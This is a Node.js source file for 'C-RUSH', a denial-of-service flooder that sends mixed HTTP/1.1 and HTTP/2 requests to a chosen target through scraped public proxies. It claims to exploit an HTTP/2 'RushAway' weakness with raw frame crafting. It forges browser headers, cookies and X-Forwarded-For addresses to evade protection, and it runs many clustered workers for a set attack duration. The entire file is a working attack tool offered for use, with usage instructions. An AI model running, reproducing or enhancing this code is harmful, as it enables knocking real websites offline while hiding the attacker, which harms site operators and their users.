const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec } = require('child_process');
const httpx = require('axios');
const { performance } = require('perf_hooks');

// Enhanced ignore lists with more error codes and patterns
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError', 'DeprecationWarning', 'FetchError', 'SocketError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT', 'DEP0123', 'ERR_TLS_CERT_ALTNAME_INVALID', 'ERR_SSL_WRONG_VERSION_NUMBER', 'HPE_INVALID_METHOD', 'HPE_INVALID_URL'];

// Enhanced browser and device lists with more variations
const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Brave', 'Vivaldi', 'Yandex'];
const devices = ['Windows NT 10.0; Win64; x64', 'Windows NT 6.1; Win64; x64', 'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 10_14_6', 'X11; Linux x86_64', 'X11; Ubuntu; Linux x86_64', 'Android 10; Mobile', 'Android 9.0; Mobile', 'iPhone; CPU iPhone OS 14_0 like Mac OS X', 'iPad; CPU OS 14_0 like Mac OS X'];

// Enhanced version lists with more variations
const versions = {
    Chrome: ['110.0.0.0', '111.0.0.0', '112.0.0.0', '113.0.0.0', '114.0.0.0', '115.0.0.0', '116.0.0.0', '117.0.0.0', '118.0.0.0', '119.0.0.0', '120.0.0.0', '121.0.0.0', '122.0.0.0'],
    Firefox: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0', '121.0', '122.0'],
    Safari: ['15.0', '15.1', '15.2', '15.3', '15.4', '15.5', '15.6', '16.0', '16.1', '16.2', '16.3', '16.4', '16.5'],
    Edge: ['110.0', '111.0', '112.0', '113.0', '114.0', '115.0', '116.0', '117.0', '118.0', '119.0', '120.0', '121.0', '122.0'],
    Opera: ['95', '96', '97', '98', '99', '100', '101', '102', '103', '104', '105', '106', '107'],
    Brave: ['1.40', '1.41', '1.42', '1.43', '1.44', '1.45', '1.46', '1.47'],
    Vivaldi: ['5.5', '5.6', '5.7', '5.8', '5.9', '6.0', '6.1', '6.2'],
    Yandex: ['22.9', '22.10', '22.11', '22.12', '23.1', '23.2', '23.3']
};

// Enhanced cookie lists with more variations
const cookieNames = ['session', 'user', 'token', 'id', 'auth', 'pref', 'theme', 'lang', 'consent', 'tracking', 'analytics', 'ab_test'];
const cookieValues = ['abc123', 'xyz789', 'def456', 'temp', 'guest', 'user', 'admin', 'visitor', 'test', 'beta', 'prod', 'staging'];

// Enhanced referrer list for more realistic traffic
const referrers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.duckduckgo.com/',
    'https://www.reddit.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.linkedin.com/',
    'https://www.youtube.com/',
    'https://www.amazon.com/',
    'https://www.ebay.com/',
    'https://www.wikipedia.org/'
];

// Enhanced proxy list with more sources
const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/raw.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'http://worm.rip/http.txt',
    'https://proxyspace.pro/http.txt',
    'https://proxy-spider.com/api/proxies.example.txt1',
    'http://193.200.78.26:8000/http?key=free',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt',
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt'
];

// Enhanced options parsing
const args = process.argv.slice(2);
const options = {
    cookies: args.includes('-c'),
    headfull: args.includes('-h'),
    version: args.includes('-v') ? args[args.indexOf('-v') + 1] : '2',
    cache: args.includes('-ch') ? args[args.indexOf('-ch') + 1] === 'true' : true,
    debug: !args.includes('-s'),
    jitter: args.includes('-j') ? parseFloat(args[args.indexOf('-j') + 1]) : 0.2,
    timeout: args.includes('-t') ? parseInt(args[args.indexOf('-t') + 1]) : 10000,
    keepalive: args.includes('-k') ? parseInt(args[args.indexOf('-k') + 1]) : 30000
};

// Enhanced random cookie generator with more variations
function generateRandomCookie() {
    const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
    const value = cookieValues[Math.floor(Math.random() * cookieValues.length)] + 
                 Math.random().toString(36).substring(2, 10) + 
                 (Math.random() > 0.5 ? '_' + Math.floor(Date.now() / 1000).toString(36) : '');
    const expires = new Date(Date.now() + 86400000).toUTCString();
    const path = Math.random() > 0.7 ? '; Path=/' : '';
    const domain = Math.random() > 0.7 ? `; Domain=.${url.hostname}` : '';
    const secure = Math.random() > 0.5 ? '; Secure' : '';
    const httpOnly = Math.random() > 0.5 ? '; HttpOnly' : '';
    const sameSite = Math.random() > 0.7 ? '; SameSite=Lax' : '';
    
    return `${name}=${value}${path}${domain}${secure}${httpOnly}${sameSite}`;
}

// Enhanced proxy scraping with retry logic
async function scrapeProxies() {
    const file = "proxy.txt";
    const maxRetries = 3;

    try {
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
            if(options.debug) console.log(colors.red(`File ${file} removed!\n`) + colors.yellow(`Refreshing proxies...\n`));
        }

        for (const proxy of proxyList) {
            let retries = 0;
            while (retries < maxRetries) {
                try {
                    const response = await httpx.get(proxy, {
                        timeout: options.timeout,
                        headers: {
                            'User-Agent': generateUserAgent()
                        }
                    });
                    fs.appendFileSync(file, response.data);
                    break;
                } catch (err) {
                    retries++;
                    if (retries === maxRetries && options.debug) {
                        console.log(colors.yellow(`Failed to fetch proxies from ${proxy} after ${maxRetries} attempts`));
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000 * retries));
                }
            }
        }

        // Deduplicate proxies
        const proxyData = fs.readFileSync(file, 'utf-8');
        const uniqueProxies = [...new Set(proxyData.split('\n').filter(p => p.length > 0))];
        fs.writeFileSync(file, uniqueProxies.join('\n'));

        const total = uniqueProxies.length;
        if(options.debug) console.log(`${colors.white(`( ${colors.yellow(total)} ${colors.white(')')} ${colors.green('Unique proxies scraped/refreshed.')}`)}`)

    } catch (err) {
        if(options.debug) console.log(colors.red('Error scraping proxies:'), err.message);
        process.exit(1);
    }
}

// Enhanced user agent generator with more realistic patterns
function generateUserAgent() {
    const browser = browsers[Math.floor(Math.random() * browsers.length)];
    const device = devices[Math.floor(Math.random() * devices.length)];
    const version = versions[browser][Math.floor(Math.random() * versions[browser].length)];

    let ua = '';

    if (device.includes('Android')) {
        const androidVersion = device.match(/Android (\d+(?:\.\d+)?)/)[1];
        ua = `Mozilla/5.0 (Linux; Android ${androidVersion}; ${Math.random() > 0.5 ? 'Mobile' : 'Tablet'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Mobile${Math.random() > 0.5 ? '' : ' Safari/537.36'}`;
    } else if (device.includes('iPhone') || device.includes('iPad')) {
        const osVersion = device.match(/OS (\d+_\d+)/)[1];
        ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Mobile/15E148 Safari/604.1`;
    } else {
        switch(browser) {
            case 'Chrome':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
                if (Math.random() > 0.7) ua += ` Edg/${version}`;
                break;
            case 'Firefox':
                ua = `Mozilla/5.0 (${device}; rv:${version}) Gecko/20100101 Firefox/${version}`;
                break;
            case 'Safari':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
                break;
            case 'Edge':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`;
                break;
            case 'Opera':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 OPR/${version}`;
                break;
            case 'Brave':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Brave Chrome/${version} Safari/537.36`;
                break;
            case 'Vivaldi':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Vivaldi/${version}`;
                break;
            case 'Yandex':
                ua = `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} YaBrowser/${version} Safari/537.36`;
                break;
        }
    }

    // Add some random noise to make it more human-like
    if (Math.random() > 0.8) {
        ua = ua.replace(/\)/, `; ${Math.random() > 0.5 ? 'Win64' : 'x64'})`);
    }

    return ua;
}

// Enhanced error handling
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.emitWarning = function() {};

process
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if(options.debug) console.log(colors.yellow(`Uncaught Exception: ${e.message}`));
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if(options.debug) console.log(colors.yellow(`Unhandled Rejection: ${e.message}`));
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
        if(options.debug) console.log(colors.yellow(`Warning: ${e.message}`));
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

if (process.argv[2] === 'scrape') {
    console.clear();
    scrapeProxies();
    return;
}

if (process.argv.length < 7) {
    console.clear();
    console.log(colors.red(`
    ${colors.green(`ðŸ`)} C-RUSH Flooder - HTTP/1.1 & HTTP/2 Mixed RushAway
        ${colors.gray(`Made with â¤ï¸ by NIKKI (${colors.red(`@`)}getflood)`)}

    ${colors.gray(`Features${colors.red(`:`)}
    - Implements HTTP/2 multiplexing with custom stream prioritization
    - Exploits RushAway vulnerability in HTTP/2 implementations
    - Utilizes HPACK header compression for amplification
    - Flooding with mixed HTTP/1.1 & HTTP/2 (GET + POST + HEAD + PUT + DELETE)
    - Features proxy rotation and connection pooling
    - Advanced human-like traffic patterns
    - Enhanced bypass techniques
    - Low CPU usage with high RPS`)}

    ${colors.gray(`Usage${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js <target> <duration> <proxies.txt> <threads> <rate> [options]`)}
    ${colors.gray(`node c-rush.js scrape`)} ${colors.gray(`(to scrape proxies)`)}

    ${colors.gray(`Options${colors.red(`:`)}`)}
    ${colors.gray(`-c: Enable random cookies`)}
    ${colors.gray(`-h: Enable headfull requests`)}
    ${colors.gray(`-v <1/2>: Choose HTTP version (1 or 2)`)}
    ${colors.gray(`-ch <true/false>: Enable/disable cache`)}
    ${colors.gray(`-s: Disable debug output`)}
    ${colors.gray(`-j <0-1>: Jitter factor (0-1, default 0.2)`)}
    ${colors.gray(`-t <ms>: Timeout in milliseconds (default 10000)`)}
    ${colors.gray(`-k <ms>: Keepalive time in milliseconds (default 30000)`)}

    ${colors.gray(`Example${colors.red(`:`)}`)}
    ${colors.gray(`node c-rush.js https://target.com 120 proxies.txt 100 64 -c -h -v 2 -j 0.3`)}
    `));
    process.exit(1);
}

const target = process.argv[2];
const duration = process.argv[3];
const proxyFile = process.argv[4];
const threads = parseInt(process.argv[5]);
const rate = parseInt(process.argv[6]);

let proxies = [];
let proxy = [];

try {
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().split('\n').filter(p => p.length > 0);
    proxy = proxies;
} catch (e) {
    if(options.debug) console.log(colors.red('ðŸš« Error loading proxy file'));
    process.exit(1);
}

let stats = {
    requests: 0,
    goaway: 0,
    success: 0,
    forbidden: 0,
    errors: 0
}

let statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let timer = 0;

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const url = new URL(target);

// Enhanced frame encoding with error handling
function encodeFrame(streamId, type, payload = "", flags = 0) {
    try {
        let frame = Buffer.alloc(9)
        frame.writeUInt32BE(payload.length << 8 | type, 0)
        frame.writeUInt8(flags, 4)
        frame.writeUInt32BE(streamId, 5)
        if (payload.length > 0)
            frame = Buffer.concat([frame, payload])
        return frame
    } catch (e) {
        if(options.debug) console.log(colors.yellow(`Frame encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

// Enhanced frame decoding with error handling
function decodeFrame(data) {
    try {
        if (!data || data.length < 9) return null;
        
        const lengthAndType = data.readUInt32BE(0)
        const length = lengthAndType >> 8
        const type = lengthAndType & 0xFF
        const flags = data.readUint8(4)
        const streamId = data.readUInt32BE(5)
        const offset = flags & 0x20 ? 5 : 0

        let payload = Buffer.alloc(0)

        if (length > 0) {
            payload = data.subarray(9 + offset, 9 + offset + length)

            if (payload.length + offset != length) {
                return null
            }
        }

        return {
            streamId,
            length,
            type,
            flags,
            payload
        }
    } catch (e) {
        if(options.debug) console.log(colors.yellow(`Frame decoding error: ${e.message}`));
        return null;
    }
}

function encodeSettings(settings) {
    try {
        const data = Buffer.alloc(6 * settings.length)
        for (let i = 0; i < settings.length; i++) {
            data.writeUInt16BE(settings[i][0], i * 6)
            data.writeUInt32BE(settings[i][1], i * 6 + 2)
        }
        return data
    } catch (e) {
        if(options.debug) console.log(colors.yellow(`Settings encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

function encodeRstStream(streamId, type, flags) {
    try {
        const frameHeader = Buffer.alloc(9);
        frameHeader.writeUInt32BE(4, 0);
        frameHeader.writeUInt8(type, 4);
        frameHeader.writeUInt8(flags, 5);
        frameHeader.writeUInt32BE(streamId, 5);
        const statusCode = Buffer.alloc(4).fill(0);
        return Buffer.concat([frameHeader, statusCode]);
    } catch (e) {
        if(options.debug) console.log(colors.yellow(`RST_STREAM encoding error: ${e.message}`));
        return Buffer.alloc(0);
    }
}

// Enhanced request builder with more human-like headers
function buildRequest() {
    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
    const method = methods[Math.floor(Math.random() * methods.length)];
    const userAgent = generateUserAgent();
    const referrer = referrers[Math.floor(Math.random() * referrers.length)];

    let headers = `${method} ${url.pathname}${Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : ''} HTTP/1.1\r\n` +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n' +
        'Accept-Encoding: gzip, deflate, br\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n` +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        `Referer: ${referrer}\r\n`;

    if (options.cookies) {
        headers += `Cookie: ${generateRandomCookie()}; ${generateRandomCookie()}\r\n`;
    }

    if (options.headfull) {
        headers += 'Sec-Fetch-Dest: document\r\n' +
            'Sec-Fetch-Mode: navigate\r\n' +
            'Sec-Fetch-Site: cross-site\r\n' +
            'Sec-Fetch-User: ?1\r\n' +
            'Upgrade-Insecure-Requests: 1\r\n' +
            `User-Agent: ${userAgent}\r\n` +
            'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n' +
            'sec-ch-ua-mobile: ?0\r\n' +
            'sec-ch-ua-platform: "Windows"\r\n';
            
        if (Math.random() > 0.7) {
            headers += 'DNT: 1\r\n';
        }
    } else {
        headers += `User-Agent: ${userAgent}\r\n`;
    }

    // Add some random headers to make it more human-like
    if (Math.random() > 0.5) {
        headers += 'X-Requested-With: XMLHttpRequest\r\n';
    }
    if (Math.random() > 0.7) {
        headers += 'X-Forwarded-For: ' + 
                  Math.floor(Math.random() * 255) + '.' + 
                  Math.floor(Math.random() * 255) + '.' + 
                  Math.floor(Math.random() * 255) + '.' + 
                  Math.floor(Math.random() * 255) + '\r\n';
    }

    headers += '\r\n';

    return Buffer.from(headers, 'binary');
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

// Enhanced connection handler with jitter and better error handling
function go() {
    const proxyEntry = proxy[~~(Math.random() * proxy.length)];
    if (!proxyEntry) {
        setTimeout(go, 100);
        return;
    }

    const [proxyHost, proxyPort] = proxyEntry.split(':');

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        setTimeout(go, 100);
        return;
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: options.version === '1' ? ['http/1.1'] : ['h2', 'http/1.1'],
                servername: url.hostname,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | 
                             crypto.constants.SSL_OP_NO_TICKET | 
                             crypto.constants.SSL_OP_NO_SSLv2 | 
                             crypto.constants.SSL_OP_NO_SSLv3 | 
                             crypto.constants.SSL_OP_NO_COMPRESSION | 
                             crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | 
                             crypto.constants.SSL_OP_TLSEXT_PADDING | 
                             crypto.constants.SSL_OP_ALL,
                secure: true,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                rejectUnauthorized: false,
                timeout: options.timeout
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1' || options.version === '1') {
                    function doWrite() {
                        if (tlsSocket.destroyed) return;
                        
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                stats.requests++;
                                setTimeout(() => {
                                    doWrite()
                                }, isFull ? 1000 : (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter)))
                            } else {
                                stats.errors++;
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }

                    doWrite()

                    tlsSocket.on('error', () => {
                        stats.errors++;
                        tlsSocket.end(() => tlsSocket.destroy())
                    })

                    tlsSocket.on('close', () => {
                        setTimeout(go, 100);
                    })

                    return;
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 7 || frame.type == 5) {
                                stats.goaway++;
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE'];
                    const method = methods[Math.floor(Math.random() * methods.length)];
                    const userAgent = generateUserAgent();
                    const referrer = referrers[Math.floor(Math.random() * referrers.length)];

                    let headers = [
                        [':method', method],
                        [':authority', url.hostname],
                        [':scheme', 'https'],
                        [':path', url.pathname + (Math.random() > 0.7 ? '?' + Math.random().toString(36).substring(2, 7) : '')],
                        ['user-agent', userAgent],
                        ['accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'],
                        ['accept-encoding', 'gzip, deflate, br'],
                        ['accept-language', 'en-US,en;q=0.9'],
                        ['cache-control', options.cache ? 'max-age=0' : 'no-cache'],
                        ['referer', referrer]
                    ];

                    if (options.cookies) {
                        headers.push(['cookie', `${generateRandomCookie()}; ${generateRandomCookie()}`]);
                    }

                    if (options.headfull) {
                        headers = headers.concat([
                            ['sec-ch-ua', '"Chromium";v="120"'],
                            ['sec-ch-ua-mobile', '?0'],
                            ['sec-ch-ua-platform', '"Windows"'],
                            ['sec-fetch-dest', 'document'],
                            ['sec-fetch-mode', 'navigate'],
                            ['sec-fetch-site', 'cross-site'],
                            ['sec-fetch-user', '?1'],
                            ['upgrade-insecure-requests', '1']
                        ]);

                        if (Math.random() > 0.7) {
                            headers.push(['dnt', '1']);
                        }
                    }

                    // Add some random headers to make it more human-like
                    if (Math.random() > 0.5) {
                        headers.push(['x-requested-with', 'XMLHttpRequest']);
                    }
                    if (Math.random() > 0.7) {
                        headers.push(['x-forwarded-for', 
                            Math.floor(Math.random() * 255) + '.' + 
                            Math.floor(Math.random() * 255) + '.' + 
                            Math.floor(Math.random() * 255) + '.' + 
                            Math.floor(Math.random() * 255)]);
                    }

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    requests.push(encodeFrame(streamId, 1, packed, 0x25));
                    streamId += 2;

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            stats.requests++;
                            setTimeout(doWrite, (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter)));
                        } else {
                            stats.errors++;
                            tlsSocket.end(() => tlsSocket.destroy());
                        }
                    });
                }

                doWrite();

                tlsSocket.on('error', () => {
                    stats.errors++;
                    tlsSocket.end(() => tlsSocket.destroy());
                });

                tlsSocket.on('close', () => {
                    setTimeout(go, 100);
                });
            });
        });

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    netSocket.on('error', () => {
        stats.errors++;
        netSocket.destroy();
        setTimeout(go, 100);
    });

    netSocket.setTimeout(options.keepalive, () => {
        netSocket.destroy();
        setTimeout(go, 100);
    });
}

if (cluster.isMaster) {
    console.clear();
    if(options.debug) {
        console.log(colors.red(`
 ${colors.green(`ðŸ`)} C-RUSH - H1 & H2 Mixed RushAway Flooder
     ${colors.gray(`Made with â¤ï¸ by NIKKI (${colors.red(`@`)}getflood)`)}

  ${colors.gray(`Target${colors.red(`:`)} ${target}`)}
  ${colors.gray(`Duration${colors.red(`:`)} ${duration}s`)}
  ${colors.gray(`Threads${colors.red(`:`)} ${threads}`)}
  ${colors.gray(`Rate${colors.red(`:`)} ${rate}/s`)}
  ${colors.gray(`HTTP Version${colors.red(`:`)} ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'}`)}
  ${colors.gray(`Cookies${colors.red(`:`)} ${options.cookies ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Headfull${colors.red(`:`)} ${options.headfull ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Cache${colors.red(`:`)} ${options.cache ? 'Enabled' : 'Disabled'}`)}
  ${colors.gray(`Jitter${colors.red(`:`)} ${options.jitter}`)}
  ${colors.gray(`Timeout${colors.red(`:`)} ${options.timeout}ms`)}
  ${colors.gray(`Keepalive${colors.red(`:`)} ${options.keepalive}ms`)}
`));
    }

    let totalRequests = 0;
    let lastRequests = 0;
    let startTime = performance.now();
    
    setInterval(() => {
        const currentRequests = stats.requests;
        const rps = currentRequests - lastRequests;
        lastRequests = currentRequests;
        totalRequests = currentRequests;
        
        setTitle(`C-RUSH | Total: ${totalRequests} | RPS: ${rps} | ${options.version === '1' ? 'HTTP/1.1' : 'HTTP/2'} RushAway`);
    }, 1000);

    // Worker management for better CPU distribution
    const workers = [];
    for(let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        workers.push(worker);
        
        worker.on('message', (msg) => {
            if (msg.type === 'stats') {
                stats.requests += msg.requests;
                stats.goaway += msg.goaway;
                stats.success += msg.success;
                stats.forbidden += msg.forbidden;
                stats.errors += msg.errors;
            }
        });
    }

    // Stats reporting
    setInterval(() => {
        if(options.debug) {
            console.log(colors.gray(`Requests: ${stats.requests} | Success: ${stats.success} | Errors: ${stats.errors} | GoAway: ${stats.goaway}`));
        }
    }, 5000);

    setTimeout(() => {
        if(options.debug) console.log(colors.red('\nðŸ Attack finished'));
        workers.forEach(worker => worker.kill());
        process.exit(0);
    }, duration * 1000);
} else {
    // Add jitter to worker startup to avoid thundering herd
    setTimeout(() => {
        setInterval(() => {
            go();
        }, 1000 / rate);
    }, Math.random() * 1000);
    
    // Report stats to master
    setInterval(() => {
        process.send({
            type: 'stats',
            requests: stats.requests,
            goaway: stats.goaway,
            success: stats.success,
            forbidden: stats.forbidden,
            errors: stats.errors
        });
        // Reset stats for next interval
        stats = {
            requests: 0,
            goaway: 0,
            success: 0,
            forbidden: 0,
            errors: 0
        };
    }, 1000);
}
